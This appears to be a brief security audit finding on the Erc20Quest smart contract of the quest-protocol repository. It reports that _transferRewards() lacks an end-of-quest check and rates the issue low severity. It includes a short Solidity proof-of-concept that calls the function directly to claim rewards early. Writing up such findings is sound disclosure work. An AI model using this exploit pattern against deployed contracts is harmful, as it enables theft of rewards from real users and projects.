contract: https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L61 

The _transferRewards() function does not check if the quest has ended, which could allow an attacker to claim rewards before the quest has ended.

Severity: Low

PoC
function exploit() public {
    Erc20Quest quest = Erc20Quest(<address of deployed contract>);
    quest._transferRewards(<address of attacker>, <amount>);
}